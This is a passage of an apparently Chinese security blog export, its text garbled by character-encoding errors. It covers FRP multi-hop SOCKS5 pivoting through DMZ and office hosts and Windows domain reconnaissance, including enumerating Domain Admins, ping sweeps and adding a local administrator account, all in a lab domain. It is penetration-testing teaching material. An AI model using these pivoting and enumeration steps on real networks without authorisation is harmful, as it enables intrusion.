./frps.ini</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯é…ç½®æ–‡ä»¶fprs.iniçš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>2.Windows Server 2012å¯åŠ¨FRPå®¢æˆ·ç«¯,è¿æ¥VPSçš„æœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\frpc.exe -c .\fprc.ini</span><br></pre></td></tr></table></figure><p>åŒæ—¶å°†æœ¬åœ°10808ç«¯å£è½¬å‘åˆ°VPSçš„1080ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp      #æ‰€ä½¿ç”¨çš„åè®®ç±»å‹</span><br><span class="line">local_ip = 10.10.10.13  #æœ¬åœ°ç›‘å¬çš„IPåœ°å€</span><br><span class="line">local_port = 10808      #è¦è½¬å‘çš„æœ¬åœ°ç«¯å£</span><br><span class="line">remote_port = 1080      #è¦è½¬å‘åˆ°çš„è¿œç¨‹ç«¯å£</span><br></pre></td></tr></table></figure><p>3.Windows Server 2012å¯åŠ¨ä¸€ä¸ªFRPæœåŠ¡ç«¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯é…ç½®æ–‡ä»¶frps.iniå†…å®¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13 #åœ¨Windows Server 2012ä¸Šçš„FRPæœåŠ¡å™¨ç»‘å®šçš„IPåœ°å€</span><br><span class="line">bind_port = 7000        #åœ¨Windows Server 2012ä¸Šçš„FRPæœåŠ¡ç«¯ç»‘å®šçš„ç«¯å£</span><br></pre></td></tr></table></figure><p>4.DMSçš„FTPæœåŠ¡å™¨ä¸Šå¯åŠ¨FRPå®¢æˆ·ç«¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>è¿æ¥Windows Server 2012 å¹¶åœ¨10808ç«¯å£ä¸Šå¯åŠ¨SOCKS5ä»£ç†æœåŠ¡å,è½¬å‘åˆ°Windows Server 2012çš„10808ç«¯å£ä¸Šã€‚<br>frpc.iniçš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10808   #ä»£ç†æ‰€ä½¿ç”¨çš„ç«¯å£,ä¼šè¢«è½¬å‘åˆ°æœåŠ¡ç«¯</span><br><span class="line">plugin = SOCKS5       #ä»£ç†çš„ç±»å‹</span><br></pre></td></tr></table></figure><p>åˆ°æ­¤,æˆåŠŸåœ¨DMZåŒºä¸åŠå…¬åŒºä¹‹é—´æ­å»ºäº†ä¸€ä¸ªäºŒçº§ç½‘ç»œçš„SOCKS5ä»£ç†<br>åŒç†,åœ¨ProxyChainsæ–‡ä»¶çš„æœ€åä¸€è¡Œæ·»åŠ  â€œsocks5 192.168.2.x 1080â€</p><h4 id="3-ä¸‰çº§ç½‘ç»œä»£ç†"><a href="#3-ä¸‰çº§ç½‘ç»œä»£ç†" class="headerlink" title="3.ä¸‰çº§ç½‘ç»œä»£ç†"></a>3.ä¸‰çº§ç½‘ç»œä»£ç†</h4><p>ä¸äºŒå±‚åŒç†,åœ¨äºŒå±‚çš„åŸºç¡€ä¸Šå¤šäº†ä¸€çº§ä»£ç†ã€‚<br>1.DMSçš„FTPæœåŠ¡å™¨å¯åŠ¨ä¸€ä¸ªFRPå®¢æˆ·ç«¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.30.40</span><br><span class="line">local_port = 10809</span><br><span class="line">remote_port = 10808</span><br></pre></td></tr></table></figure><p>2.DMSçš„FTPæœåŠ¡å™¨ä¸Šå¯åŠ¨ä¸€ä¸ªFRPæœåŠ¡ç«¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p>frps.ini</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>3.åŠå…¬åŒºçš„æ–‡ä»¶æœåŠ¡å™¨å¯åŠ¨FRPå®¢æˆ·ç«¯,è¿æ¥FTPæœåŠ¡å™¨çš„FRPæœåŠ¡ç«¯,å¹¶åœ¨10809ç«¯å£ä¸Šå¯åŠ¨SOCKS5ä»£ç†æœåŠ¡å,è½¬å‘åˆ°FTPæœåŠ¡å™¨çš„10809ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10809</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>ä¸‰çº§ç½‘ç»œä»£ç†æ­å»ºå®Œæˆã€‚åœ¨ProxyChainsé…ç½®æ–‡ä»¶çš„æœ€åä¸€è¡Œæ·»åŠ â€socks5 192.168.2.x 1080â€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop 192.168.60.10</span><br></pre></td></tr></table></figure><p>å³å¯è¿æ¥è¿œç¨‹æ¡Œé¢</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€(äºŒ)-å†…ç½‘ä¿¡æ¯æ”¶é›†</title>
      <link href="/2023/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%BA%8C)-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%BA%8C)-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-æœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›†"><a href="#1-æœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1.æœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›†"></a>1.æœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ç³»ç»Ÿä¿¡æ¯æœé›†"><a href="#1-ç³»ç»Ÿä¿¡æ¯æœé›†" class="headerlink" title="1.ç³»ç»Ÿä¿¡æ¯æœé›†"></a>1.ç³»ç»Ÿä¿¡æ¯æœé›†</h3><p>1.æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS VersioN&quot; </span><br><span class="line">systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031023541.png" alt="image.png"></p><p>2.æŸ¥çœ‹å½“å‰çš„è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031025782.png" alt="image.png"></p><p>WMICæ˜¯Windowsç®¡ç†è§„èŒƒçš„å‘½ä»¤è¡Œå·¥å…·<br>é€šè¿‡wmicæŸ¥è¯¢ä¸»æœºè¿›ç¨‹ä¿¡æ¯ï¼Œè¿‡æ»¤å‡ºè¿›ç¨‹çš„è·¯å¾„ã€åç§°å’ŒPID</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get Name, ProcessId, ExecutablePath</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031028007.png" alt="image.png"></p><p>æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹çš„è·¯å¾„ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process where Name=&quot;msdtc.exe&quot; get ExecutablePath</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031028574.png" alt="image.png"></p><p>3.æŸ¥çœ‹å½“å‰çš„æœåŠ¡ä¿¡æ¯<br>æŸ¥çœ‹æ‰€æœ‰æœåŠ¡ä¿¡æ¯å¹¶è¿‡æ»¤å‡ºæœåŠ¡çš„åç§°ã€è·¯å¾„ã€åˆ›å»ºæ—¶é—´ã€è¿è¡ŒçŠ¶æ€ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get Caption,Name,PathName,StartName,State</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031030707.png" alt="image.png"></p><p>æŸ¥çœ‹æŒ‡å®šæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service where Name=&quot;vds&quot; get Caption,Name,PathName,StartName,State</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031034263.png" alt="image.png"></p><p>4.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /v /fo list </span><br><span class="line">schtasks /query /v /fo list &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031036114.png" alt="image.png"></p><p>5.æŸ¥çœ‹ç¨‹åºè‡ªå¯åŠ¨ç¨‹åºä¿¡æ¯<br>æŸ¥çœ‹è‡ªå¯åŠ¨ç¨‹åºä¿¡æ¯ï¼Œè¿‡æ»¤å‡º åç§°ã€æ‰§è¡Œå‘½ä»¤ã€æ‰§è¡Œè·¯å¾„ã€æ‰€å±ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic startup get Caption,Command,Location,User</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031040978.png" alt="image.png"></p><p>6..æŸ¥çœ‹è¡¥ä¸å®‰è£…ä¿¡æ¯<br>æŸ¥çœ‹å½“å‰ä¸»æœºä¸Šå®‰è£…çš„è¡¥ä¸åˆ—è¡¨ï¼Œå¹¶è¿‡æ»¤å‡ºè¡¥ä¸è¿æ¥ã€åç§°ã€æè¿°ã€è¡¥ä¸ç¼–å·ä»¥åŠå®‰è£…æ—¶é—´,å¯ä»¥æ¨æµ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿç‰ˆæœ¬å’Œç¼ºå°‘çš„è¡¥ä¸è¾…åŠ©åé¢çš„ææƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031143129.png" alt="image.png"></p><p>7.æŸ¥çœ‹åº”ç”¨å®‰è£…ä¿¡æ¯<br>æŸ¥çœ‹ä¸»æœºå®‰è£…çš„åº”ç”¨è½¯ä»¶ä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºåº”ç”¨çš„åç§°å’Œç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wmic product get Caption,Version</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031141646.png" alt="image.png"></p><h3 id="2-ç”¨æˆ·ä¿¡æ¯æœé›†"><a href="#2-ç”¨æˆ·ä¿¡æ¯æœé›†" class="headerlink" title="2.ç”¨æˆ·ä¿¡æ¯æœé›†"></a>2.ç”¨æˆ·ä¿¡æ¯æœé›†</h3><ol><li>æŸ¥çœ‹ç”¨æˆ·åŠæ‰€å¤„ç»„ã€æ‰€æ‹¥æœ‰ç‰¹æƒ<br>æµ‹è¯•äººå‘˜å¯ä»¥æ ¹æ®å½“å‰æ‰€æœ‰çš„ä¿¡æ¯å¯¹å½“å‰ç”¨æˆ·æƒé™è¿›è¡Œä¸€ä¸ªåˆ¤æ–­,æ¨æµ‹æ˜¯å¦éœ€è¦è¿›ä¸€æ­¥ææƒ<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure></li></ol><p>2.æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·&#x2F;ç»„ä¿¡æ¯<br>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line">net user &lt;username&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031148012.png" alt="image.png"></p><p>äº§çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031149312.png" alt="image.png"><br>è¯¥ä¸»æœºåŠ å…¥åŸŸæ—¶,åŸŸå…¨å±€ç»„â€HACK-MY\Domain Adminsâ€è‡ªåŠ¨æ·»åŠ åˆ°è®¡ç®—æœºæœ¬åœ°Administratosç»„ä¸­ã€‚</p><p>ä¸»æœºæœ¬åœ°åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·å¹¶åŠ å…¥ç®¡ç†å‘˜ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line">net localgroup Administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031152986.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031152673.png"></p><p>3.æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031154032.png" alt="image.png"></p><h3 id="3-ç½‘ç»œä¿¡æ¯æœé›†"><a href="#3-ç½‘ç»œä¿¡æ¯æœé›†" class="headerlink" title="3.ç½‘ç»œä¿¡æ¯æœé›†"></a>3.ç½‘ç»œä¿¡æ¯æœé›†</h3><p>1.æŸ¥çœ‹ç½‘ç»œé…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬IPï¼Œä¸»æœºåç­‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>æœ‰å¤šç½‘æ®µå°è¯•åæœŸæ¨ªå‘ç§»åŠ¨<br>DNSæœåŠ¡å™¨çš„IPä¸€èˆ¬ä¸ºDCçš„IP<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031157283.png" alt="image.png"></p><p>2.æŸ¥çœ‹ä¸»æœºè·¯ç”±ä¿¡æ¯ï¼ˆè·¯ç”±è¡¨ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>ç½‘ç»œç›®æ ‡éƒ½æ˜¯ä¸»æœºå¯ä»¥è®¿é—®åˆ°çš„,å¯ä»¥ç”¨æ¥çœ‹IPæ®µ,æµ‹è¯•äººå¯åœ¨åç»­çš„æ¨ªå‘æ¸—é€ä¸­å°è¯•æ¢æµ‹å…¶ä¸­çš„å­˜æ´»ä¸»æœº</p><p>3.æŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031201862.png" alt="image.png"></p><p>4.æŸ¥çœ‹å½“å‰ä¼šè¯åˆ—è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ä¸»æœºä¸å®¢æˆ·ç«¯ä¸»æœºçš„ä¼šè¯</p><p>5.æŸ¥çœ‹å½“å‰ä¸»æœºç½‘ç»œå…±äº«ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031205511.png" alt="image.png"></p><p>6.æŸ¥çœ‹å·²è¿æ¥çš„ç½‘ç»œå…±äº«</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><h2 id="2-åŸŸå†…ä¿¡æ¯æœé›†"><a href="#2-åŸŸå†…ä¿¡æ¯æœé›†" class="headerlink" title="2.åŸŸå†…ä¿¡æ¯æœé›†"></a>2.åŸŸå†…ä¿¡æ¯æœé›†</h2><p>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å·¥ä½œç«™ä¿¡æ¯ï¼ŒåŒ…æ‹¬è®¡ç®—æœºåã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬åã€å·¥ä½œç«™ã€ç™»å½•åŸŸä¿¡æ¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031208863.png" alt="image.png"></p><p>2.æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ä¿¡æ¯<br>æŸ¥çœ‹æ‰€æœ‰åŸŸç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031209598.png" alt="image.png"></p><p>æŸ¥çœ‹æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &lt;username&gt; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031210145.png" alt="image.png"></p><p>è·å–æ‰€æœ‰ç”¨æˆ·çš„SIDã€æ‰€å±åŸŸå’Œç”¨æˆ·æè¿°ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get Caption,Domain,Description</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031213328.png" alt="image.png"><br>åªæœ‰åŸŸç”¨æˆ·å…·æœ‰æƒé™æ‰§è¡ŒåŸŸå†…æŸ¥è¯¢æ“ä½œã€‚éåŸŸç”¨æˆ·é™¤éæ˜¯æœ¬æœºç³»ç»Ÿæƒé™ï¼Œå¦åˆ™åªèƒ½æŸ¥è¯¢æœ¬æœºä¿¡æ¯ã€‚æ‰€æœ‰ä¸åŸŸç›¸å…³çš„æŸ¥è¯¢éƒ½éœ€è¦é€šè¿‡åŸŸæ§åˆ¶å™¨æ¥å®ç°ï¼Œå¹¶ä¸”éœ€è¦ç»è¿‡Kerberosåè®®è¿›è¡Œè®¤è¯ã€‚</p><p>3.æŸ¥çœ‹åŸŸç”¨æˆ·ç»„ä¿¡æ¯<br>åˆ—å‡ºæ‰€æœ‰çš„åŸŸå†…ç”¨æˆ·ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031222625.png" alt="image.png"></p><p>æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç»„ã€‚å¾—åˆ°æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031227086.png" alt="image.png"></p><p>æŸ¥è¯¢åŸŸæˆå‘˜ç»„,å¾—åˆ°åŸŸå†…æ‰€æœ‰çš„å®¢æˆ·ç«¯ä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031344930.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031343628.png" alt="image.png"></p><p>4.æŸ¥çœ‹åŸŸå†…å¯†ç ç­–ç•¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031345113.png" alt="image.png"></p><p>5.æŸ¥çœ‹åŸŸæ§åˆ¶å™¨åˆ—è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031348505.png" alt="image.png"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡nltestå‘½ä»¤æŸ¥è¯¢æŒ‡å®šåŸŸæ§åˆ¶å™¨ä¸»æœºåˆ—è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /DCLIST:hack-my.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031349397.png"></p><p>6.æŸ¥çœ‹ä¸»åŸŸæ§åˆ¶å™¨<br>ä¸»æ§åˆ¶å™¨ä¼šè¢«ç”¨ä½œæ—¶é—´æœåŠ¡å™¨ï¼Œæ‰€æœ‰åŸŸä¸­è®¡ç®—æœºçš„æ—¶é’ŸåŒæ­¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031350356.png" alt="image.png"></p><p>7.å®šä½åŸŸæ§åˆ¶å™¨<br>çŸ¥é“ç›®æ ‡ä¸»æœºåå¯ä»¥å¯¹ä¸»æœºä½¿ç”¨pingå‘½ä»¤ï¼Œæ ¹æ®è¿”å›å†…å®¹å¾—çŸ¥ç›®æ ‡ä¸»æœºåœ¨å†…ç½‘ä¸­çš„IP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping DC.hack-my.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031351951.png" alt="image.png"></p><p>8.æŸ¥çœ‹åŸŸä¿¡ä»»å…³ç³»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p>åŸŸä¿¡ä»»ç”¨äºå¤šåŸŸç¯å¢ƒä¸­çš„è·¨åŸŸèµ„æºå…±äº«ï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€åœ¨åŸŸå’Œå…¶ä»–åŸŸé—´çš„ä¿¡ä»»å…³ç³»<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031352883.png" alt="image.png"></p><h2 id="3-å†…ç½‘èµ„æºæ¢æµ‹"><a href="#3-å†…ç½‘èµ„æºæ¢æµ‹" class="headerlink" title="3.å†…ç½‘èµ„æºæ¢æµ‹"></a>3.å†…ç½‘èµ„æºæ¢æµ‹</h2><h3 id="1-å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº"><a href="#1-å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº" class="headerlink" title="1.å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº"></a>1.å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</h3><p>1.åŸºäºicmpå‘ç°å­˜æ´»ä¸»æœº<br>å¯¹æ•´ä¸ªç½‘æ®µè¿›è¡Œpingå‘½ä»¤<br>å¾ªç¯æ¢æµ‹æ•´ä¸ªå±€åŸŸç½‘Cæ®µä¸­å­˜æ´»çš„ä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</span><br><span class="line">-n å‘é€æ•°æ®åŒ…æ•°</span><br><span class="line">-w pingçš„æ—¶é—´</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040905713.png" alt="image.png"></p><p>2.åŸºäºnetbiosåè®®å‘ç°å­˜æ´»ä¸»æœº<br>netbioså·¥ä½œæµç¨‹æ˜¯å°†æœºå™¨åè§£æï¼ŒæŸ¥è¯¢ï¼Œåº”ç­”ã€‚Windowsä¸­ï¼Œé»˜è®¤å®‰è£…TCP&#x2F;IPåä¼šè‡ªåŠ¨å®‰è£…netbios.<br>å‘å±€åŸŸç½‘ä¸­æ¯ä¸ªipå‘é€netbiosæŸ¥è¯¢ï¼Œå¯ä»¥è·å¾—ä¸»æœºåã€macåœ°å€ç­‰ä¿¡æ¯</p><p>nbtscanæ˜¯ä¸€æ¬¾ç”¨äºæ‰«æWindowsç½‘ç»œä¸Šçš„netbiosåç§°çš„ç¨‹åºï¼Œç”¨äºå‘ç°å†…ç½‘ä¸­å­˜æ´»çš„Windowsä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbtscan.exe 10.10.10.0/24</span><br></pre></td></tr></table></figure><p>kaliè‡ªå¸¦nbtscan<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040910745.png"><br>windows: <a href="https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4">https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040922891.png" alt="image.png"></p><p>3.åŸºäºUDPå‘ç°å­˜æ´»ä¸»æœº<br>å°†ç©ºçš„UDPæŠ¥æ–‡å‘é€ç»™ç›®æ ‡ä¸»æœºç‰¹å®šç«¯å£ï¼Œå¦‚æœç«¯å£å…³é—­ï¼ŒUDPæ¢æµ‹å°±èƒ½é©¬ä¸Šå¾—åˆ°ICMPç«¯å£æ— æ³•åˆ°è¾¾çš„å›åº”æŠ¥æ–‡ã€‚<br>å¦‚æœå¼€æ”¾ç«¯å£ï¼Œå¤§éƒ¨åˆ†æœåŠ¡ä»…å¿½ç•¥è¿™ä¸ªç©ºæŠ¥æ–‡è€Œä¸åšä»»ä½•å›åº”</p><p>Unicornscanæ˜¯kaliçš„ä¿¡æ¯æœé›†å·¥å…·ï¼Œæä¾›äº†ç½‘ç»œæ‰«æåŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unicornscan -mU 10.10.10.0/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040945461.png" alt="image.png"></p><p>4.åŸºäºARPåœ¨å®é™…åˆ©ç”¨ä¸­ï¼Œå¯ä»¥å‘ç½‘ç»œå‘é€ä¸€ä¸ªARPè¯·æ±‚ï¼Œè‹¥ç›®æ ‡ä¸»æœºå¤„äºæ´»è·ƒçŠ¶æ€ï¼Œåˆ™å…¶ä¸€å®šä¼šå›åº”ä¸€ä¸ªARPå“åº”ï¼Œå¦åˆ™ä¸ä¼šåšå‡ºä»»ä½•å›åº”ã€‚<br>a.ARP-scan<br>ARP-scanåˆ©ç”¨ARPå‘ç°å†…ç½‘ä¸­å­˜æ´»çš„ä¸»æœº</p><figure 